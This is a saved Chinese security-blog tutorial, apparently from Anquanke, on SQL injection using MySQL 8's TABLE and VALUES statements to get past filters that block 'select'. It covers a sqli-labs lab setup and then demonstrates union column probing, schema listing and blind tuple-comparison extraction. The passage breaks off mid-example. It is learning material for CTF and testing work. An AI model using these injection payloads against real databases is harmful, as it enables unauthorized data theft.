@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://www.anquanke.com/post/id/231627 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="renderer" content="webkit">
+<meta name="force-rendering" content="webkit">
+<meta name="referrer" content="always">
+<meta name="description" content="安全客 - 安全资讯平台">
+<link rel="icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<link rel="shortcut icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+
+  <title>浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台</title>
+  <meta name="description" content="安全客 - 安全资讯平台">
+  <meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+  <script>(function(window){
+        
+
+function empty() {}
+
+empty();
+      })(this);</script>
+
+<link rel="stylesheet" href="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/d4cec9cd8efbfd10.css">
+<link rel="stylesheet" href="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/a51843d6b82241be,d94674bd62441768,56ce5cef8079a575,8514be0a921ca6e8,4802c0c382205144,8e4464e423fe6849,13c0bf3b0c2e4882,2b3936345af879da,f568b72da28701d3,da046392ff3eccb9,aa4b116b0af3b8cd,e0bfaead3067b.css">
+<script>window._dynamic_deps_={}</script>
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+
+<body>
+  <div id="app" data-v-app=""><div class="_9" style="height: 60px;"><div class="g-w"><a class="logo1" href="https://www.anquanke.com/"></a><div class="_10"><div class="item"><div style="cursor: pointer;"><span>首页</span><ul></ul></div></div><div class="item"><div><span>阅读</span><ul><li class="sub-item"><a href="https://www.anquanke.com/news">安全资讯</a></li><li class="sub-item"><a href="https://www.anquanke.com/knowledge">安全知识</a></li><li class="sub-item"><a href="https://www.anquanke.com/tool">安全工具</a></li></ul></div></div><div class="item"><div style="cursor: pointer;"><span>活动</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>招聘</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>安全导航</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>内容精选</span><ul><li class="sub-item"><a href="https://www.anquanke.com/column/index.html">专栏</a></li><li class="sub-item"><a href="https://www.anquanke.com/subject-list">精选专题</a></li><li class="sub-item"><a href="https://www.anquanke.com/discovery">安全客季刊</a></li><li class="sub-item"><a href="https://www.anquanke.com/week-list">360网络安全周报</a></li></ul></div></div></div><div class="_11"><div class="block"><div class="search"><input class="input" placeholder="输入关键词搜索"><button class="button"></button></div><!----><div class="user-href js-login-body" style="display: none;"><div class="user-href-top"><p class="user-avatar-bottom"><img class="user-href-avatar"><!----></p><div class="user-href-top-main"><p class="user-href-grade"></p><p class="user-href-text"><span>累计积分</span><span>可用积分</span></p><p class="user-href-score"><span></span><span></span></p></div></div><ul><li><a href="https://www.anquanke.com/member.html?memberId=undefined">个人主页</a></li><li><a href="https://www.anquanke.com/setting?p=message">我的消息</a></li><li><a href="https://www.anquanke.com/user/set1.html">个人设置</a></li><li><a href="https://www.anquanke.com/user/score/search.html">积分商城</a></li><li>退出登录</li></ul></div><a href="https://www.anquanke.com/login/index.html" class="nologin"></a></div><span class="write"></span><a class="app" href="https://www.anquanke.com/app"><div class="app-img"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01103704213901dd1e.png"></div></a></div></div></div><div class="index"><div class="index-main"><div class="_55"><h1>浅谈利用mysql8新特性进行SQL注入</h1><div class="read"><p><span class="read-text">阅读量</span><b class="read-num">278988</b></p><p><span class="read-sep">|</span><span class="read-text">评论</span><b class="read-num">7</b></p><p><span class="read-sep">|</span><img class="read-fee" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01f942715e2a0f1a23.png"></p></div><p class="publish">发布时间 : 2021-03-01 10:00:17</p><div class="_54" style="display: none;"><b class="close">x</b><h5>译文声明</h5><p> 本文是翻译文章<!----><!----></p><!----><p>译文仅供参考，具体内容表达以及含义原文为准。</p></div><div class="content" id="js-article">
+
+
+<p><img class="alignnone size-full wp-image-232304 aligncenter" alt="" width="720" height="360" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01fa599e3b29e2aff9.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-0" id="h2-0">0x00 前言</h2>
+<p>前段时间遇到一个题考查的是mysql8的table注入。当时没有做出来。之前有了解过mysql8的table注入，但做题的时候没有想到。这里简单总结复现一下mysql8新特性的sql注入。</p>
+<p>&nbsp;</p>
+<h2 name="h2-1" id="h2-1">0x01 MySQL8介绍</h2>
+<p>在ubuntu20 apt源中集成了mysql 8.0.20。官方表示MySQL8要比MySQL5.7快2倍，支持json,nosql，修改了默认身份验证等其他改进。</p>
+<p>&nbsp;</p>
+<h2 name="h2-2" id="h2-2">0x02 基本环境配置</h2>
+<h3 name="h3-3" id="h3-3">
+<a class="reference-link" name="1%E3%80%81%E6%90%AD%E5%BB%BAMySQL8%E7%8E%AF%E5%A2%83"></a>1、搭建MySQL8环境</h3>
+<p>最简单的方法，就是使用docker拉取镜像搭建</p>
+<pre><code class="lang-bash hljs language-bash">docker pull mysql:8.0.21
+docker run -d --name=mysql8 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.21
+</code></pre>
+<h3 name="h3-4" id="h3-4">
+<a class="reference-link" name="2%E3%80%81%E6%90%AD%E5%BB%BASQL%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83"></a>2、搭建SQL注入环境</h3>
+<p>1.下载vulstudy综合环境：<a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a><br>
+2.启动vulstudy综合环境里的sql注入的靶场<br>
+3.进入容器修改sqli-lab的配置文件：</p>
+<pre><code class="lang-bash hljs language-bash"><span class="hljs-comment">#安装vim</span>
+sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list
+apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get install vim
+<span class="hljs-comment">#修改sqli-lab的配置文件</span>
+vim /app/sql-connections/db-creds.inc
+</code></pre>
+<p>填写mysql相关连接信息，数据库的IP填宿主机IP(我这里是172.30.102.102)</p>
+<p><img class="alignnone size-full wp-image-232293 aligncenter" alt="" width="436" height="197" data-original="https://p5.ssl.qhimg.com/t015736d456f85fb604.png"></p>
+<p>4.然后在mysql8容器里通过下面sql语句修改默认认证方式(因为mysql8.0默认认证方式和5不一样)：</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">'123456'</span>;
+</code></pre>
+<p>5.重新配置数据库，环境搭建完成。</p>
+<p>&nbsp;</p>
+<h2 name="h2-5" id="h2-5">0x03 MySQL8语法新特性</h2>
+<p>在MySQL 8.0.19之后，MySQL推出几种新语法</p>
+<h3 name="h3-6" id="h3-6">
+<a class="reference-link" name="1%E3%80%81TABLE%20statement"></a>1、TABLE statement</h3>
+<p><strong>TABLE statement</strong><br><strong>作用</strong>：列出表中全部内容</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]
+</code></pre>
+<p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>
+支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。<br><strong>例子</strong>：<br>
+首先选择mysql数据库：<code>use security;</code></p>
+<pre><code class="lang-sql hljs language-sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">TABLE</span> users;
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------------+</span>
+<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password   <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------------+</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span> Dumb       <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Angelina <span class="hljs-operator">|</span> I<span class="hljs-operator">-</span>kill<span class="hljs-operator">-</span>you <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Dummy    <span class="hljs-operator">|</span> p<span class="hljs-variable">@ssword</span>   <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">4</span> <span class="hljs-operator">|</span> secure   <span class="hljs-operator">|</span> crappy     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> stupid   <span class="hljs-operator">|</span> stupidity  <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> superman <span class="hljs-operator">|</span> genious    <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> batman   <span class="hljs-operator">|</span> mob<span class="hljs-operator">!</span>le     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">8</span> <span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span> admin      <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">9</span> <span class="hljs-operator">|</span> admin1   <span class="hljs-operator">|</span> admin1     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span> <span class="hljs-number">10</span> <span class="hljs-operator">|</span> admin2   <span class="hljs-operator">|</span> admin2     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span> <span class="hljs-number">11</span> <span class="hljs-operator">|</span> admin3   <span class="hljs-operator">|</span> admin3     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span> <span class="hljs-number">12</span> <span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span> dumbo      <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span> <span class="hljs-number">14</span> <span class="hljs-operator">|</span> admin4   <span class="hljs-operator">|</span> admin4     <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------------+</span>
+<span class="hljs-number">13</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)
+</code></pre>
+<p>加上order by排序或LIMIT限制后</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">table</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> password;
+<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>;
+<span class="hljs-keyword">table</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;
+<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>;
+</code></pre>
+<p><img class="alignnone size-full wp-image-232294 aligncenter" alt="" width="329" height="190" data-original="https://p2.ssl.qhimg.com/t0143d3b3111b46d9ad.png"></p>
+<p><img class="alignnone size-full wp-image-232295 aligncenter" alt="" width="274" height="549" data-original="https://p5.ssl.qhimg.com/t0109ab4bf9abf2ab62.png"></p>
+<p><strong>与SELECT的区别</strong>：</p>
+<blockquote><p>1.TABLE始终显示表的所有列<br>
+2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</p></blockquote>
+<h3 name="h3-7" id="h3-7">
+<a class="reference-link" name="2%E3%80%81VALUES%20statement"></a>2、VALUES statement</h3>
+<p><strong>VALUES statement</strong><br><strong>作用</strong>：列出一行的值</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">VALUES</span> row_constructor_list [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_designator] [LIMIT <span class="hljs-keyword">BY</span> number]
+
+row_constructor_list:
+    <span class="hljs-type">ROW</span>(value_list)[, <span class="hljs-type">ROW</span>(value_list)][, ...]
+
+value_list:
+    <span class="hljs-keyword">value</span>[, <span class="hljs-keyword">value</span>][, ...]
+
+column_designator: 
+    column_index
+</code></pre>
+<p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。<br>
+ROW()返回的是一个行数据，VALUES将<code>ROW()返回的行数据</code>加上<code>字段</code>整理为一个表，然后展示<br><strong>例子</strong>：</p>
+<pre><code class="lang-sql hljs language-sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">TABLE</span> emails;
+<span class="hljs-operator">+</span><span class="hljs-comment">----+------------------------+</span>
+<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> email_id               <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+------------------------+</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb<span class="hljs-variable">@dhakkan</span>.com       <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Angel<span class="hljs-variable">@iloveu</span>.com       <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Dummy<span class="hljs-variable">@dhakkan</span>.<span class="hljs-keyword">local</span>    <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">4</span> <span class="hljs-operator">|</span> secure<span class="hljs-variable">@dhakkan</span>.<span class="hljs-keyword">local</span>   <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> stupid<span class="hljs-variable">@dhakkan</span>.<span class="hljs-keyword">local</span>   <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> superman<span class="hljs-variable">@dhakkan</span>.<span class="hljs-keyword">local</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> batman<span class="hljs-variable">@dhakkan</span>.<span class="hljs-keyword">local</span>   <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">8</span> <span class="hljs-operator">|</span> admin<span class="hljs-variable">@dhakkan</span>.com      <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+------------------------+</span>
+<span class="hljs-number">8</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;
+<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+------------+</span>
+<span class="hljs-operator">|</span> column_0 <span class="hljs-operator">|</span> column_1 <span class="hljs-operator">|</span> column_2   <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+------------+</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">2</span>        <span class="hljs-operator">|</span> <span class="hljs-number">3</span>          <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span> Dumb       <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Angelina <span class="hljs-operator">|</span> I<span class="hljs-operator">-</span>kill<span class="hljs-operator">-</span>you <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Dummy    <span class="hljs-operator">|</span> p<span class="hljs-variable">@ssword</span>   <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">4</span> <span class="hljs-operator">|</span> secure   <span class="hljs-operator">|</span> crappy     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">5</span> <span class="hljs-operator">|</span> stupid   <span class="hljs-operator">|</span> stupidity  <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">6</span> <span class="hljs-operator">|</span> superman <span class="hljs-operator">|</span> genious    <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">7</span> <span class="hljs-operator">|</span> batman   <span class="hljs-operator">|</span> mob<span class="hljs-operator">!</span>le     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">8</span> <span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span> admin      <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>        <span class="hljs-number">9</span> <span class="hljs-operator">|</span> admin1   <span class="hljs-operator">|</span> admin1     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>       <span class="hljs-number">10</span> <span class="hljs-operator">|</span> admin2   <span class="hljs-operator">|</span> admin2     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>       <span class="hljs-number">11</span> <span class="hljs-operator">|</span> admin3   <span class="hljs-operator">|</span> admin3     <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>       <span class="hljs-number">12</span> <span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span> dumbo      <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span>       <span class="hljs-number">14</span> <span class="hljs-operator">|</span> admin4   <span class="hljs-operator">|</span> admin4     <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+------------+</span>
+<span class="hljs-number">14</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-8" id="h2-8">0x04 利用MySQL8新特性绕过select</h2>
+<p><strong>场景</strong>：select关键词被过滤，多语句无法使用<br><strong>测试环境</strong>：<br>
+1.mysql命令终端<br>
+2.sqli-labs靶场Less-1</p>
+<h3 name="h3-9" id="h3-9">
+<a class="reference-link" name="1%E3%80%81%E5%9C%A8mysql%E5%91%BD%E4%BB%A4%E7%BB%88%E7%AB%AF%E6%B5%8B%E8%AF%95"></a>1、在mysql命令终端测试</h3>
+<h4 id="h4-1-">
+<a class="reference-link" name="1.%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"></a>1.判断列数</h4>
+<p>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">union</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);
+</code></pre>
+<p><img class="alignnone size-full wp-image-232296 aligncenter" alt="" width="713" height="186" data-original="https://p2.ssl.qhimg.com/t0175748e148e86fe86.png"></p>
+<h4 id="h4-2-values-">
+<a class="reference-link" name="2.%E4%BD%BF%E7%94%A8values%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"></a>2.使用values判断回显位</h4>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">values</span> <span class="hljs-type">row</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);
+</code></pre>
+<p><img class="alignnone size-full wp-image-232297 aligncenter" alt="" width="558" height="167" data-original="https://p4.ssl.qhimg.com/t01e258d55b6024b751.png"></p>
+<h4 id="h4-3-">
+<a class="reference-link" name="3.%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"></a>3.列出所有数据库名</h4>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-keyword">table</span> information_schema.schemata;
+</code></pre>
+<p><img class="alignnone size-full wp-image-232298 aligncenter" alt="" width="1074" height="282" data-original="https://p0.ssl.qhimg.com/t01f6c9882a9d487246.png"></p>
+<h4 id="h4-4-">
+<a class="reference-link" name="4.%E7%9B%B2%E6%B3%A8%E6%9F%A5%E8%AF%A2%E4%BB%BB%E6%84%8F%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9"></a>4.盲注查询任意表中的内容</h4>
+<p>语句<code>table users limit 1;</code>的查询结果：</p>
+<pre><code class="lang-sql hljs language-sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>;
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
+<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
+<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<p>实质上是<code>(id, username, password)</code>与<code>(1, 'Dumb', 'Dumb')</code>进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。<br>
+两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。</p>
+<pre><code class="lang-sql hljs language-sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-operator">|</span>                                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">2</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">2</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-operator">|</span>                                 <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Du'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Du'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------+</span>
+<span class="hljs-operator">|</span>                                   <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dum'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dum'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+</span>
+<span class="hljs-operator">|</span>                                    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------+</span>
